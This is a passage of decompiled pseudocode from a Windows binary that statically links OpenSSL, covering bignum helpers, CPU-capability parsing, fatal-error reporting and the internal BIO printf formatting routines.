      *(_DWORD *)(v14 + *(_DWORD *)v3) = v13;
      v13 = 0;
      v11 = 3;
    }
  }
  while ( v8 );
  v16 = *(_DWORD *)(v3 + 4);
  if ( v16 > 0 )
  {
    v17 = (_DWORD *)(*(_DWORD *)v3 + 4 * v16);
    do
    {
      if ( *--v17 )
        break;
      --v16;
    }
    while ( v16 > 0 );
    *(_DWORD *)(v3 + 4) = v16;
  }
  return v3;
}

//----- (00417640) --------------------------------------------------------
int __cdecl sub_417640(_DWORD *a1, int a2)
{
  int result; // eax
  int v3; // ebx
  int v4; // edi
  int i; // eax

  if ( a2 < 0 )
    return 0;
  v3 = a2 / 32;
  if ( a1[1] > a2 / 32 )
    goto LABEL_11;
  v4 = v3 + 1;
  if ( v3 + 1 > a1[2] )
    result = (int)sub_4171F0((int)a1, v3 + 1);
  else
    result = (int)a1;
  if ( result )
  {
    for ( i = a1[1]; i < v4; ++i )
      *(_DWORD *)(*a1 + 4 * i) = 0;
    a1[1] = v4;
LABEL_11:
    *(_DWORD *)(*a1 + 4 * v3) |= 1 << (a2 & 0x1F);
    return 1;
  }
  return result;
}

//----- (004176D0) --------------------------------------------------------
void **__cdecl sub_4176D0(int a1)
{
  void **v2; // eax
  void **v3; // esi

  if ( !a1 )
    return 0;
  if ( (*(_BYTE *)(a1 + 16) & 8) != 0 )
    v2 = (void **)sub_416900();
  else
    v2 = (void **)sub_4168C0();
  v3 = v2;
  if ( !v2 )
    return 0;
  if ( !sub_4173E0(v2, (_DWORD *)a1) )
  {
    sub_417060(v3);
    return 0;
  }
  return v3;
}

//----- (00417720) --------------------------------------------------------
int sub_417720()
{
  return sub_42AE00(&CriticalSection);
}

//----- (00417730) --------------------------------------------------------
int __cdecl sub_417730(_DWORD *a1)
{
  if ( a1[2] )
    return sub_42AC30((int *)&CriticalSection, (int)sub_417720, a1, &dword_4F1B24, 1, 0);
  else
    return 1;
}
// 4F1B24: using guessed type int dword_4F1B24;

//----- (00417760) --------------------------------------------------------
int __cdecl sub_417760(_DWORD *a1)
{
  if ( a1[2] )
    return sub_42AC30((int *)&CriticalSection, (int)sub_417720, a1, &dword_4F1B24, 1, 1);
  else
    return 1;
}
// 4F1B24: using guessed type int dword_4F1B24;

//----- (00417790) --------------------------------------------------------
_DWORD *sub_417790()
{
  return sub_42AE50((int *)&CriticalSection, 1);
}

//----- (004177A0) --------------------------------------------------------
int __cdecl sub_4177A0(int a1, int a2)
{
  *(_DWORD *)(a1 + 8) = a2;
  return 1;
}

//----- (004177C0) --------------------------------------------------------
void sub_4177C0()
{
  char *v0; // eax
  const char *v1; // esi
  BOOL v2; // edi
  const char *v3; // ebx
  unsigned int v4; // eax
  unsigned int v5; // eax
  int v6; // edx
  int v7; // edx
  char *v8; // eax
  _BYTE *v9; // eax
  BOOL v10; // esi
  unsigned int v11; // eax
  unsigned int v12; // eax
  int v13; // edx
  unsigned int v14; // [esp+0h] [ebp-8h] BYREF
  int v15; // [esp+4h] [ebp-4h]

  if ( !CriticalSection.LockCount )
  {
    CriticalSection.LockCount = 1;
    v0 = getenv("OPENSSL_ia32cap");
    v1 = v0;
    if ( !v0 )
    {
      v12 = sub_413680((int)&dword_73C6D0);
      v15 = v13;
LABEL_14:
      dword_73C6D0 = v12 | 0x400;
      dword_73C6D4 = v15;
      return;
    }
    v2 = *v0 == 126;
    v3 = &v0[v2];
    if ( !sscanf(&v0[v2], "%I64i", &v14) )
    {
      v14 = strtoul(v3, 0, 0);
      v15 = 0;
    }
    if ( v2 )
    {
      v4 = sub_413680((int)&dword_73C6D0);
      v5 = ~v14 & v4;
      v7 = ~v15 & v6;
    }
    else
    {
      if ( *v1 != 58 )
      {
LABEL_10:
        dword_73C6D8 = 0;
        v8 = strchr(v1, 58);
        if ( v8 )
        {
          v9 = v8 + 1;
          v10 = *v9 == 126;
          v11 = strtoul(&v9[v10], 0, 0);
          if ( v10 )
            dword_73C6D8 &= ~v11;
          else
            dword_73C6D8 = v11;
        }
        v12 = v14;
        goto LABEL_14;
      }
      v5 = sub_413680((int)&dword_73C6D0);
    }
    v15 = v7;
    v14 = v5;
    goto LABEL_10;
  }
}
// 417855: variable 'v6' is possibly undefined
// 41786B: variable 'v7' is possibly undefined
// 4178E5: variable 'v13' is possibly undefined
// 73C6D0: using guessed type int dword_73C6D0;
// 73C6D4: using guessed type int dword_73C6D4;
// 73C6D8: using guessed type int dword_73C6D8;

//----- (004178F0) --------------------------------------------------------
int sub_4178F0()
{
  int (*_OPENSSL_isservice)(void); // eax
  HMODULE ModuleHandleW; // eax
  HWINSTA ProcessWindowStation; // ebx
  void *v3; // esp
  wchar_t v5[6]; // [esp+0h] [ebp-14h] BYREF
  DWORD nLengthNeeded; // [esp+Ch] [ebp-8h] BYREF

  _OPENSSL_isservice = (int (*)(void))CriticalSection.OwningThread;
  if ( CriticalSection.OwningThread
    || ((ModuleHandleW = GetModuleHandleW(0)) == 0
      ? (_OPENSSL_isservice = (int (*)(void))CriticalSection.OwningThread)
      : (int (*)(void))(_OPENSSL_isservice = GetProcAddress(ModuleHandleW, "_OPENSSL_isservice"),
                        CriticalSection.OwningThread = _OPENSSL_isservice),
        _OPENSSL_isservice) )
  {
    if ( _OPENSSL_isservice != (int (*)(void))-1 )
      return _OPENSSL_isservice();
  }
  else
  {
    CriticalSection.OwningThread = (HANDLE)-1;
  }
  ProcessWindowStation = GetProcessWindowStation();
  if ( !ProcessWindowStation )
    return -1;
  if ( GetUserObjectInformationW(ProcessWindowStation, 2, 0, 0, &nLengthNeeded) )
    return -1;
  if ( GetLastError() != 122 )
    return -1;
  if ( nLengthNeeded > 0x200 )
    return -1;
  nLengthNeeded = (nLengthNeeded + 1) & 0xFFFFFFFE;
  v3 = alloca(nLengthNeeded + 2);
  if ( !GetUserObjectInformationW(ProcessWindowStation, 2, v5, nLengthNeeded, &nLengthNeeded) )
    return -1;
  nLengthNeeded = (nLengthNeeded + 1) & 0xFFFFFFFE;
  v5[nLengthNeeded >> 1] = 0;
  return wcsstr(v5, L"Service-0x") != 0;
}

//----- (00417A30) --------------------------------------------------------
HANDLE sub_417A30(LPCCH lpMultiByteStr, ...)
{
  HANDLE StdHandle; // eax
  void *v2; // esi
  int v3; // eax
  HANDLE result; // eax
  unsigned int v5; // kr00_4
  unsigned int v6; // edi
  void *v7; // esp
  const wchar_t *v8; // esi
  unsigned int v9; // eax
  unsigned int v10; // eax
  WCHAR *v11; // ecx
  WCHAR v12; // dx
  HANDLE v13; // esi
  WCHAR v14[6]; // [esp+0h] [ebp-214h] BYREF
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-208h] BYREF
  wchar_t Buffer[256]; // [esp+10h] [ebp-204h] BYREF
  va_list va; // [esp+220h] [ebp+Ch] BYREF

  va_start(va, lpMultiByteStr);
  StdHandle = GetStdHandle(0xFFFFFFF4);
  v2 = StdHandle;
  if ( StdHandle && GetFileType(StdHandle) )
  {
    v3 = _vsnprintf((char *const)Buffer, 0x200u, lpMultiByteStr, va);
    if ( v3 < 0 )
      v3 = 512;
    return (HANDLE)WriteFile(v2, Buffer, v3, &NumberOfBytesWritten, 0);
  }
  else
  {
    v5 = strlen(lpMultiByteStr);
    v6 = v5 + 1;
    v7 = alloca(2 * (v5 + 1));
    v8 = v14;
    if ( v14 )
    {
      v9 = MultiByteToWideChar(0, 0, lpMultiByteStr, v6, v14, v6);
      if ( !v9 && v5 != -1 )
      {
        do
        {
          v14[v9] = lpMultiByteStr[v9];
          ++v9;
        }
        while ( v9 < v6 );
      }
      v10 = 0;
      if ( v5 != -1 )
      {
        do
        {
          if ( v14[v10] == 37 )
          {
            v11 = &v14[v10 + 1];
            while ( 2 )
            {
              switch ( *v11 )
              {
                case '*':
                case '-':
                case '.':
                case '0':
                case '1':
                case '2':
                case '3':
                case '4':
                case '5':
                case '6':
                case '7':
                case '8':
                case '9':
                  ++v10;
                  ++v11;
                  continue;
                case 'C':
                  v12 = 99;
                  goto LABEL_20;
                case 'S':
                  v12 = 115;
LABEL_20:
                  v14[v10 + 1] = v12;
                  break;
                case 'c':
                  v14[v10 + 1] = 67;
                  break;
                case 's':
                  v14[v10 + 1] = 83;
                  break;
                default:
                  goto LABEL_21;
              }
              break;
            }
          }
LABEL_21:
          ++v10;
        }
        while ( v10 < v6 );
      }
    }
    else
    {
      v8 = L"no stack?";
    }
    _vsnwprintf(Buffer, 0xFFu, v8, va);
    Buffer[255] = 0;
    if ( GetVersion() >= 0x80000000 || sub_4178F0() <= 0 )
    {
      return (HANDLE)MessageBoxW(0, Buffer, L"OpenSSL: FATAL", 0x10u);
    }
    else
    {
      result = RegisterEventSourceW(0, L"OpenSSL");
      v13 = result;
      if ( result )
      {
        NumberOfBytesWritten = (DWORD)Buffer;
        ReportEventW(result, 1u, 0, 0, 0, 1u, 0, (LPCWSTR *)&NumberOfBytesWritten, 0);
        return (HANDLE)DeregisterEventSource(v13);
      }
    }
  }
  return result;
}

//----- (00417C70) --------------------------------------------------------
void __cdecl __noreturn sub_417C70(const char *a1, const char *Args, int a3)
{
  sub_417A30("%s:%d: OpenSSL internal error: %s\n", Args, a3, a1);
  raise(22);
  _exit(3);
}
// 417C70: using guessed type const char *Args;

//----- (00417CA0) --------------------------------------------------------
int sub_417CA0()
{
  return sub_42AE00((LPCRITICAL_SECTION)&CriticalSection.LockSemaphore);
}

//----- (00417CB0) --------------------------------------------------------
int __cdecl sub_417CB0(int *a1)
{
  int *v1; // esi
  int (__cdecl *v2)(int *, _DWORD, int **, _DWORD); // eax
  int v3; // eax

  v1 = a1;
  v2 = (int (__cdecl *)(int *, _DWORD, int **, _DWORD))a1[7];
  if ( v2 && (v3 = v2(a1, 0, &a1, 0), v3 > 0) )
    return sub_42AC30((int *)&CriticalSection.LockSemaphore, (int)sub_417CA0, v1, a1, v3, 0);
  else
    return 1;
}

//----- (00417D00) --------------------------------------------------------
int __cdecl sub_417D00(int *a1)
{
  int *v1; // esi
  int (__cdecl *v2)(int *, _DWORD, int **, _DWORD); // eax
  int v3; // eax

  v1 = a1;
  v2 = (int (__cdecl *)(int *, _DWORD, int **, _DWORD))a1[7];
  if ( v2 && (v3 = v2(a1, 0, &a1, 0), v3 > 0) )
    return sub_42AC30((int *)&CriticalSection.LockSemaphore, (int)sub_417CA0, v1, a1, v3, 1);
  else
    return 1;
}

//----- (00417D50) --------------------------------------------------------
_DWORD *__cdecl sub_417D50(int a1)
{
  return sub_42AE50((int *)&CriticalSection.LockSemaphore, a1);
}

//----- (00417D70) --------------------------------------------------------
int __cdecl sub_417D70(int a1, int a2)
{
  int (__cdecl *v2)(int, int *, _DWORD, int); // eax

  v2 = *(int (__cdecl **)(int, int *, _DWORD, int))(a1 + 28);
  if ( v2 && v2(a1, &a1, 0, a2) )
    return a1;
  sub_408310(38, 185, 146, (int)"crypto\\engine\\tb_cipher.c", 74);
  return 0;
}

//----- (00417DC0) --------------------------------------------------------
double __cdecl sub_417DC0(int a1)
{
  int v1; // eax
  double result; // st7

  v1 = a1;
  for ( result = 1.0; v1; result = result * 10.0 )
    --v1;
  return result;
}

//----- (00417DE0) --------------------------------------------------------
int __usercall sub_417DE0@<eax>(const void **a1@<ebx>, void **a2@<edi>, size_t *a3@<esi>, unsigned int *a4, char a5)
{
  unsigned int v5; // eax
  size_t v7; // eax
  void *v8; // eax
  void *v9; // eax
  _BYTE *v10; // ecx

  if ( !*a1 && !a2 )
    sub_417C70("assertion failed: *sbuffer != NULL || buffer != NULL", "crypto\\bio\\b_print.c", 827);
  if ( *a3 > *a4 )
    sub_417C70("assertion failed: *currlen <= *maxlen", "crypto\\bio\\b_print.c", 830);
  if ( a2 )
  {
    v5 = *a4;
    if ( *a3 == *a4 )
    {
      if ( v5 > 0x7FFFFBFF )
        return 0;
      v7 = v5 + 1024;
      *a4 = v7;
      if ( *a2 )
      {
        v9 = sub_413500(*a2, v7, (int)"crypto\\bio\\b_print.c", 848);
        if ( !v9 )
          return 0;
        *a2 = v9;
      }
      else
      {
        v8 = sub_4133F0(v7);
        *a2 = v8;
        if ( !v8 )
          return 0;
        if ( *a3 )
        {
          if ( !*a1 )
            sub_417C70("assertion failed: *sbuffer != NULL", "crypto\\bio\\b_print.c", 842);
          memcpy(*a2, *a1, *a3);
        }
        *a1 = 0;
      }
    }
  }
  if ( *a3 < *a4 )
  {
    v10 = *a1;
    if ( !*a1 )
      v10 = *a2;
    v10[(*a3)++] = a5;
  }
  return 1;
}

//----- (00417EE0) --------------------------------------------------------
int __fastcall sub_417EE0(int a1, const void **a2, void **a3, size_t *a4, unsigned int *a5, char *a6, char a7, int a8)
{
  int v10; // esi
  int v11; // eax
  _BYTE *v12; // eax
  int v13; // ebp
  int v16; // [esp+10h] [ebp-8h]
  _BYTE *v17; // [esp+14h] [ebp-4h]

  v16 = 0;
  if ( !a6 )
    a6 = "<NULL>";
  v10 = a8;
  if ( a8 >= 0 )
    v11 = a8;
  else
    v11 = -1;
  v12 = sub_424860(a6, v11);
  v13 = a1 - (_DWORD)v12;
  v17 = v12;
  if ( a1 < 0 || v13 < 0 )
    v13 = 0;
  if ( a8 >= 0 )
  {
    if ( a8 >= 0x7FFFFFFF - v13 )
    {
      a8 = 0x7FFFFFFF;
      v10 = 0x7FFFFFFF;
    }
    else
    {
      v10 = v13 + a8;
      a8 += v13;
    }
  }
  if ( (a7 & 1) != 0 )
    v13 = -v13;
  if ( v13 > 0 )
  {
    while ( v10 < 0 || v16 < v10 )
    {
      if ( !sub_417DE0(a2, a3, a4, a5, 32) )
        return 0;
      ++v16;
      v10 = a8;
      if ( --v13 <= 0 )
        break;
    }
  }
  while ( v17 )
  {
    if ( v10 >= 0 && v16 >= v10 )
      break;
    if ( !sub_417DE0(a2, a3, a4, a5, *a6++) )
      return 0;
    ++v16;
    v10 = a8;
    --v17;
  }
  if ( v13 < 0 )
  {
    while ( v10 < 0 || v16 < v10 )
    {
      if ( !sub_417DE0(a2, a3, a4, a5, 32) )
        return 0;
      ++v16;
      if ( ++v13 >= 0 )
        break;
      v10 = a8;
    }
  }
  return 1;
}

//----- (00418040) --------------------------------------------------------
int __fastcall sub_418040(
        void **a1,
        size_t *a2,
        const void **a3,
        unsigned int *a4,
        __int64 a5,
        unsigned int a6,
        int a7,
        int a8,
        char a9)
{
  int v9; // ebp
  __int64 v10; // rdi
  unsigned __int64 v11; // rax
  unsigned int v12; // ecx
  const char *v13; // esi
  unsigned __int64 v14; // rcx
  int v15; // esi
  unsigned int v16; // kr00_4
  int v17; // edi
  char v18; // al
  char v19; // cl
  unsigned __int64 v21; // [esp-10h] [ebp-64h]
  int v22; // [esp+10h] [ebp-44h]
  int v23; // [esp+10h] [ebp-44h]
  const char *v26; // [esp+1Ch] [ebp-38h]
  int v27; // [esp+28h] [ebp-2Ch]
  int v28[8]; // [esp+30h] [ebp-24h]

  v9 = 0;
  v28[0] = 0;
  v26 = (const char *)&unk_4F1291;
  v22 = 0;
  if ( a8 < 0 )
    a8 = 0;
  HIDWORD(v10) = HIDWORD(a5);
  v12 = HIDWORD(a5);
  LODWORD(v11) = a5;
  if ( (a9 & 0x40) == 0 )
  {
    if ( a5 >= 0 )
    {
      if ( (a9 & 2) != 0 )
      {
        v28[0] = 43;
      }
      else if ( (a9 & 4) != 0 )
      {
        v28[0] = 32;
      }
    }
    else
    {
      LODWORD(v10) = -(int)a5;
      v28[0] = 45;
      LODWORD(v11) = -(int)a5;
      v12 = (unsigned __int64)-v10 >> 32;
    }
  }
  if ( (a9 & 8) != 0 )
  {
    if ( a6 == 8 )
    {
      v26 = "0";
    }
    else if ( a6 == 16 )
    {
      v26 = "0x";
    }
  }
  if ( (a9 & 0x20) != 0 )
    v22 = 1;
  do
  {
    v13 = "0123456789ABCDEF";
    if ( !v22 )
      v13 = "0123456789abcdef";
    v21 = __PAIR64__(v12, v11);
    v14 = __PAIR64__(v12, v11) % a6;
    v11 = v21 / a6;
    *((_BYTE *)&v28[1] + v9) = v13[v14];
    v12 = HIDWORD(v11);
    ++v9;
  }
  while ( v11 && v9 < 26 );
  if ( v9 == 26 )
    v9 = 25;
  *((_BYTE *)&v28[1] + v9) = 0;
  v23 = a8 - v9;
  v15 = a8;
  if ( a8 < v9 )
    v15 = v9;
  v16 = strlen(v26);
  v17 = v28[0];
  v27 = a7 - (v28[0] != 0) - v16 - v15;
  if ( a8 - v9 < 0 )
    v23 = 0;
  if ( (int)(a7 - (v28[0] != 0) - v16 - v15) < 0 )
    v27 = 0;
  if ( (a9 & 0x10) != 0 )
  {
    if ( v23 < v27 )
      v23 = v27;
    v27 = 0;
  }
  if ( (a9 & 1) != 0 )
    v27 = -v27;
  if ( v27 <= 0 )
  {
LABEL_39:
    if ( !v17 || sub_417DE0(a3, a1, a2, a4, v17) )
    {
      v18 = *v26;
      if ( *v26 )
      {
        while ( sub_417DE0(a3, a1, a2, a4, v18) )
        {
          v18 = *++v26;
          if ( !*v26 )
            goto LABEL_44;
        }
      }
      else
      {
LABEL_44:
        if ( v23 <= 0 )
        {
LABEL_47:
          if ( v9 <= 0 )
          {
LABEL_50:
            if ( v27 >= 0 )
              return 1;
            while ( sub_417DE0(a3, a1, a2, a4, 32) )
            {
              if ( ++v27 >= 0 )
                return 1;
            }
          }
          else
          {
            while ( 1 )
            {
              v19 = *((_BYTE *)v28 + v9-- + 3);
              if ( !sub_417DE0(a3, a1, a2, a4, v19) )
                break;
              if ( v9 <= 0 )
                goto LABEL_50;
            }
          }
        }
        else
        {
          while ( sub_417DE0(a3, a1, a2, a4, 48) )
          {
            if ( --v23 <= 0 )
              goto LABEL_47;
          }
        }
      }
    }
  }
  else
  {
    while ( sub_417DE0(a3, a1, a2, a4, 32) )
    {
      if ( --v27 <= 0 )
      {
        v17 = v28[0];
        goto LABEL_39;
      }
    }
  }
  return 0;
}

//----- (00418340) --------------------------------------------------------
int __fastcall sub_418340(
        size_t *a1,
        unsigned int *a2,
        const void **a3,
        void **a4,
        double a5,
        int a6,
        int a7,
        char a8,
        int a9)
{
  int v9; // ebp
  int v10; // edx
  double v11; // st7
  double v12; // st6
  double v13; // st5
  double v14; // st4
  int v15; // ecx
  double v16; // st4
  double v17; // st6
  bool v18; // c0
  double v19; // rtt
  double v20; // st3
  double v21; // st3
  bool v22; // c0
  double v23; // rtt
  int result; // eax
  double v25; // st3
  double v26; // st7
  double v27; // st6
  unsigned int v28; // esi
  int i; // eax
  unsigned int v30; // edi
  double v31; // st4
  bool v32; // c0
  bool v33; // c3
  double v34; // st4
  int v35; // eax
  double v36; // st5
  double v37; // rt1
  double v38; // rt2
  double v39; // st4
  double v40; // st6
  double v41; // st4
  double v42; // st6
  unsigned int v43; // ecx
  int v44; // eax
  int v45; // edi
  int v46; // ecx
  int v47; // esi
  int v48; // eax
  char v49; // dl
  unsigned int *v50; // ebp
  size_t *v51; // esi
  void **v52; // edi
  char v53; // [esp-4h] [ebp-84h]
  int v54; // [esp+10h] [ebp-70h]
  int v57; // [esp+20h] [ebp-60h]
  int v58; // [esp+24h] [ebp-5Ch]
  int v59; // [esp+28h] [ebp-58h]
  int v60; // [esp+2Ch] [ebp-54h]
  int v61; // [esp+30h] [ebp-50h]
  int v62; // [esp+34h] [ebp-4Ch]
  _BYTE v63[64]; // [esp+3Ch] [ebp-44h]

  v9 = a7;
  v10 = 0;
  v60 = 0;
  v58 = 0;
  v59 = 0;
  v57 = 0;
  *(_DWORD *)v63 = 0;
  if ( a7 < 0 )
    v9 = 6;
  v11 = 0.0;
  v12 = a5;
  if ( a5 >= 0.0 )
  {
    if ( (a8 & 2) != 0 )
    {
      v60 = 43;
    }
    else if ( (a8 & 4) != 0 )
    {
      v60 = 32;
    }
  }
  else
  {
    v60 = 45;
  }
  v13 = 10.0;
  v14 = 1.0;
  if ( a9 == 2 )
  {
    if ( 0.0 == a5 )
    {
      v15 = 0;
LABEL_21:
      v61 = v15;
      goto LABEL_22;
    }
    if ( a5 < 0.0001 )
    {
      v15 = 1;
      goto LABEL_21;
    }
    if ( !v9 )
    {
      v16 = a5;
      v17 = 1.0;
      if ( a5 < 10.0 )
      {
        v15 = 0;
LABEL_20:
        v19 = v16;
        v14 = v17;
        v12 = v19;
        goto LABEL_21;
      }
LABEL_19:
      v15 = 1;
      goto LABEL_20;
    }
    if ( v9 <= 0 )
    {
      v16 = a5;
      v17 = 1.0;
    }
    else
    {
      v18 = a5 < sub_417DC0(v9);
      v13 = 10.0;
      v17 = 1.0;
      v16 = a5;
      v11 = 0.0;
      if ( !v18 )
        goto LABEL_19;
    }
    v15 = 0;
    goto LABEL_20;
  }
  v15 = a9;
  v61 = a9;
  if ( !a9 )
    goto LABEL_42;
LABEL_22:
  v20 = v12;
  if ( v11 != v12 )
  {
    v21 = v12;
    if ( v12 < v14 )
    {
      do
      {
        --v10;
        v22 = v12 * v13 < v14;
        v12 = v12 * v13;
      }
      while ( v22 );
      *(_DWORD *)v63 = v10;
    }
    v23 = v21;
    v20 = v12;
    v12 = v23;
    if ( v20 > v13 )
    {
      do
      {
        v20 = v20 / v13;
        ++v10;
      }
      while ( v20 > v13 );
      *(_DWORD *)v63 = v10;
    }
  }
  if ( a9 != 2 )
    goto LABEL_40;
  if ( !v9 )
    v9 = 1;
  if ( v15 )
  {
    --v9;
LABEL_40:
    if ( v15 == 1 )
      v12 = v20;
    goto LABEL_42;
  }
  v9 += -1 - v10;
  if ( v9 < 0 )
    return 0;
LABEL_42:
  v25 = v11;
  v26 = v12;
  if ( v25 > v12 )
    v26 = -v12;
  v27 = v14;
  if ( v26 > 4294967295.0 )
    return 0;
  v28 = (__int64)v26;
  if ( v9 > 9 )
    v9 = 9;
  for ( i = v9; i; v14 = v14 * v13 )
    --i;
  v30 = (int)v14;
  v31 = v14 - (double)(int)v14;
  v32 = v31 > 0.5;
  v33 = 0.5 == v31;
  v34 = 0.5;
  if ( v32 || v33 )
    ++v30;
  v35 = v9;
  if ( v9 )
  {
    while ( 1 )
    {
      --v35;
      v38 = v34;
      v39 = v27;
      v40 = v38;
      v41 = v39 * v13;
      if ( !v35 )
        break;
      v37 = v41;
      v34 = v40;
      v27 = v37;
    }
    v36 = v40;
    v27 = v41;
  }
  else
  {
    v36 = 0.5;
  }
  v42 = v27 * (v26 - (double)v28);
  v43 = (int)v42;
  if ( v42 - (double)(int)v42 >= v36 )
    ++v43;
  if ( v43 >= v30 )
  {
    ++v28;
    v43 -= v30;
  }
  do
  {
    v63[v58 + 4] = *(&byte_4F1CD4 + v28 % 0xA);
    v44 = v58 + 1;
    v28 /= 0xAu;
    ++v58;
  }
  while ( v28 && v44 < 20 );
  if ( v44 == 20 )
  {
    v44 = 19;
    v58 = 19;
  }
  v45 = 0;
  v63[v44 + 4] = 0;
  if ( v9 > 0 )
  {
    do
    {
      while ( a9 == 2 && !v45 && !(v43 % 0xA) )
      {
        --v9;
        v43 /= 0xAu;
        if ( v9 <= 0 )
          goto LABEL_74;
      }
      v63[v45++ + 24] = *(&byte_4F1CD4 + v43 % 0xA);
      v43 /= 0xAu;
    }
    while ( v45 < v9 );
    v59 = v45;
    if ( v45 != 20 )
      goto LABEL_75;
    v45 = 19;
LABEL_74:
    v59 = v45;
  }
LABEL_75:
  v63[v45 + 24] = 0;
  if ( v61 == 1 )
  {
    v46 = *(_DWORD *)v63;
    if ( *(int *)v63 < 0 )
      v46 = -*(_DWORD *)v63;
    v47 = 0;
    while ( 1 )
    {
      v63[v47 + 44] = *(&byte_4F1CD4 + v46 % 10);
      v46 /= 10;
      ++v47;
      if ( v46 <= 0 )
        break;
      if ( v47 >= 20 )
        return 0;
    }
    v57 = v47;
    if ( v47 == 1 )
    {
      v47 = 2;
      v63[45] = 48;
      v57 = 2;
    }
  }
  else
  {
    v47 = 0;
  }
  v48 = a6 - (v60 != 0) - (v9 > 0) - v58 - v9;
  v54 = v48;
  if ( v61 == 1 )
  {
    v48 += -2 - v47;
    v54 = v48;
  }
  v62 = v9 - v45;
  if ( v9 - v45 < 0 )
    v62 = 0;
  if ( v48 < 0 )
  {
    v48 = 0;
    v54 = 0;
  }
  if ( (a8 & 1) != 0 )
  {
    v48 = -v48;
    v54 = v48;
  }
  if ( (a8 & 0x10) != 0 )
  {
    if ( v48 > 0 )
    {
      if ( v60 )
      {
        if ( !sub_417DE0(a3, a4, a1, a2, v60) )
          return 0;
        v48 = --v54;
        v60 = 0;
      }
      if ( v48 > 0 )
      {
        while ( sub_417DE0(a3, a4, a1, a2, 48) )
        {
          if ( --v54 <= 0 )
            goto LABEL_105;
        }
        return 0;
      }
    }
  }
  else if ( v48 > 0 )
  {
    while ( sub_417DE0(a3, a4, a1, a2, 32) )
    {
      if ( --v54 <= 0 )
        goto LABEL_105;
    }
    return 0;
  }
LABEL_105:
  if ( v60 && !sub_417DE0(a3, a4, a1, a2, v60) )
    return 0;
  while ( v58 > 0 )
  {
    v49 = v63[v58-- + 3];
    if ( !sub_417DE0(a3, a4, a1, a2, v49) )
      return 0;
  }
  if ( v9 > 0 || (a8 & 8) != 0 )
  {
    v50 = a2;
    v51 = a1;
    v52 = a4;
    if ( !sub_417DE0(a3, a4, a1, a2, 46) )
      return 0;
    while ( v59 > 0 )
    {
      v53 = v63[v59-- + 23];
      if ( !sub_417DE0(a3, a4, a1, a2, v53) )
        return 0;
    }
  }
  else
  {
    v52 = a4;
    v51 = a1;
    v50 = a2;
  }
  if ( v62 > 0 )
  {
    v52 = a4;
    v51 = a1;
    v50 = a2;
    while ( sub_417DE0(a3, a4, a1, a2, 48) )
    {
      if ( --v62 <= 0 )
        goto LABEL_122;
    }
    return 0;
  }
LABEL_122:
  if ( v61 == 1 )
  {
    if ( !sub_417DE0(a3, v52, v51, v50, ~a8 & 0x20 | 0x45) )
      return 0;
    if ( *(int *)v63 >= 0 )
    {
      if ( !sub_417DE0(a3, v52, v51, v50, 43) )
        return 0;
    }
    else
    {
      result = sub_417DE0(a3, v52, v51, v50, 45);
      if ( !result )
        return result;
    }
    while ( v57 > 0 )
    {
      if ( !sub_417DE0(a3, v52, v51, v50, v63[--v57 + 44]) )
        return 0;
    }
  }
  if ( v54 < 0 )
  {
    while ( sub_417DE0(a3, a4, a1, a2, 32) )
    {
      if ( ++v54 >= 0 )
        return 1;
    }
    return 0;
  }
  return 1;
}
// 418480: variable 'v10' is possibly undefined

//----- (00418A30) --------------------------------------------------------
int __cdecl sub_418A30(const void **a1, void **a2, unsigned int *a3, _DWORD *a4, _DWORD *a5, char *a6, int *a7)
{
  int v8; // eax
  int v10; // edi
  char v11; // bl
  bool v12; // zf
  int v14; // ecx
  int v15; // eax
  int v16; // edx
  int v17; // eax
  int v18; // eax
  __int64 v19; // rax
  int v20; // eax
  char v21; // di
  int v22; // eax
  __int64 v23; // rax
  unsigned int v24; // ecx
  __int64 v25; // st7
  void *v26; // esp
  __int64 v27; // st7
  void *v28; // esp
  __int64 v29; // st7
  void *v30; // esp
  int v31; // eax
  int v32; // eax
  char *v33; // eax
  unsigned int v34; // eax
  _DWORD *v35; // eax
  size_t v36; // [esp+28h] [ebp-18h] BYREF
  int v37; // [esp+2Ch] [ebp-14h]
  int v38; // [esp+30h] [ebp-10h]
  int v39; // [esp+34h] [ebp-Ch]
  int v40; // [esp+38h] [ebp-8h]
  int v41; // [esp+3Ch] [ebp-4h]
  char *v42; // [esp+58h] [ebp+18h]

  v8 = 0;
  v39 = 0;
  v40 = 0;
  v38 = 0;
  v36 = 0;
  v10 = 0;
  v37 = -1;
LABEL_2:
  v41 = v10;
LABEL_3:
  v11 = *a6++;
LABEL_4:
  v42 = a6;
  while ( 2 )
  {
    if ( v11 && (a2 || v36 < *a3) )
    {
      switch ( v39 )
      {
        case 0:
          if ( v11 == 37 )
          {
            v39 = 1;
          }
          else if ( !sub_417DE0(a1, a2, &v36, a3, v11) )
          {
            return 0;
          }
          v11 = *v42;
          v10 = v41;
          a6 = ++v42;
          v8 = v38;
LABEL_13:
          if ( v39 == 7 )
            break;
          continue;
        case 1:
          switch ( v11 )
          {
            case ' ':
              v10 |= 4u;
              goto LABEL_2;
            case '#':
              v10 |= 8u;
              goto LABEL_2;
            case '+':
              v10 |= 2u;
              goto LABEL_2;
            case '-':
              v10 |= 1u;
              goto LABEL_2;
            case '0':
              v10 |= 0x10u;
              goto LABEL_2;
            default:
              v39 = 2;
              break;
          }
          continue;
        case 2:
          if ( isdigit((unsigned __int8)v11) )
          {
            v40 = v11 + 10 * v40 - 48;
            v8 = v38;
            goto LABEL_3;
          }
          if ( v11 == 42 )
          {
            v11 = *a6;
            v14 = *a7++;
            ++a6;
            v40 = v14;
            v42 = a6;
          }
          v8 = v38;
          v39 = 3;
          continue;
        case 3:
          if ( v11 == 46 )
          {
            v39 = 4;
            goto LABEL_3;
          }
          v39 = 5;
          continue;
        case 4:
          if ( isdigit((unsigned __int8)v11) )
          {
            v15 = v37;
            if ( v37 < 0 )
              v15 = 0;
            v16 = v11 + 10 * v15 - 48;
            v8 = v38;
            v37 = v16;
            goto LABEL_3;
          }
          if ( v11 == 42 )
          {
            v11 = *a6;
            v17 = *a7++;
            ++a6;
            v37 = v17;
            v42 = a6;
          }
          v8 = v38;
          v39 = 5;
          continue;
        case 5:
          switch ( v11 )
          {
            case 'L':
              v8 = 3;
              goto LABEL_48;
            case 'h':
              v8 = 1;
              goto LABEL_48;
            case 'l':
              if ( *a6 == 108 )
              {
                v8 = 4;
                ++a6;
              }
              else
              {
                v8 = 2;
              }
              goto LABEL_48;
            case 'q':
              v8 = 4;
LABEL_48:
              v11 = *a6++;
              v42 = a6;
              v38 = v8;
              break;
            default:
              break;
          }
          v39 = 6;
          continue;
        case 6:
          switch ( v11 )
          {
            case '%':
              v32 = sub_417DE0(a1, a2, &v36, a3, v11);
              goto LABEL_76;
